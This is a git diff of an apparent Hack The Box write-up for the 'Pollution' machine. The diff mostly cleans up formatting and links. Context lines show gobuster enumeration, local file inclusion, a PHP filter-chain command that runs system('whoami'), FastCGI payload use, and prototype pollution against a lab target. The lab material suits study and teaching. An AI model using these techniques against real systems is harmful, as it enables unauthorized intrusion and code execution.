@@ -1,13 +1,11 @@
 ---
 title: Pollution
 date: 2023-03-14
-categories: [Blog]
-tags: [competitions]     
+categories: [Writeup]
+tags: [htb]     
 author: Derrick
 TOC: true
 ---
-
-# Pollution
 
 ![](https://i.imgur.com/PrhY1LE.png)
 
@@ -46,7 +44,7 @@ Looks like a custom web application capable of handling registering for an accou
 
 ### Subdomains
 
-Command: `gobuster vhost -u [http://collect.htb/](http://collect.htb/) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`
+Command: `gobuster vhost -u http://collect.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`
     
 ```jsx
 ===============================================================
@@ -72,7 +70,7 @@ Found: developers.collect.htb Status: 401 [Size: 469]
 
 ### Directories
 
-Command: `gobuster dir -u [http://collect.htb/](http://collect.htb/) -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -r --exclude-length 26197`
+Command: `gobuster dir -u http://collect.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -r --exclude-length 26197`
     
 
 ```jsx
@@ -277,7 +275,6 @@ This information comes from `/etc/group` and `/etc/hosts` respectively. Most imp
 
 Looking back earlier, we still haven’t really tried the developers site just yet. With file read capabilities, we may be able to find credentials if we are lucky. My best guess is to try to find an `.htaccess` file commonly located within the `/var/www/YOU_DOMAIN/.htaccess` as pointed out by [Digital Ocean](https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file).
 
-[How To Use the .htaccess File  | DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file)
 
 <video width="100%" controls>
   <source src="/assets/vid/htaccess.mp4" type="video/mp4">
@@ -383,8 +380,6 @@ Initial tests with standard LFI payloads is not displaying anything but since th
 Command: `python3 [lfi.py](http://lfi.py/) --chain '<?php system("whoami"); ?>'`
     
 
-[https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
-
 ![](https://i.imgur.com/atuZhIH.png)
 
 
@@ -477,9 +472,7 @@ victor      1113  0.0  0.3 265840 15836 ?        S    Mar10   0:00  _ php-fpm: p
 victor      1114  0.0  0.3 265840 15836 ?        S    Mar10   0:00  _ php-fpm: pool victor
 ```
 
-php-fpm is FastCGI Process Manager so this should confirm what the port 9000 is. That being said, time to test the Hacktricks payloads.
-
-[9000 - Pentesting FastCGI](https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi)
+php-fpm is FastCGI Process Manager so this should confirm what the port 9000 is. That being said, time to test the [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi) payloads.
 
 This was the payload I ended up using. No need to create a long reverse shell payload if I know this is run as Victor. I can just reuse the payload I dropped earlier.
 
@@ -788,7 +781,6 @@ With our JWT, we can begin making requests to the `/admin` endpoint that was not
 > Prototype pollution is a vulnerability that exists within JavaScript when there is a function that merges data that the user can control. The by injecting into an object’s prototype, we can assign malicious values into all instances of the inherited object. Like all other user input-controlled vulnerabilities, this can be mitigated through input sanitization. For a more detailed description please give the [PortSwigger](https://portswigger.net/web-security/prototype-pollution) article a read.
 {: .prompt-danger }
 
-[What is prototype pollution? | Web Security Academy](https://portswigger.net/web-security/prototype-pollution)
 
 ```jsx
   if(req.body.text){
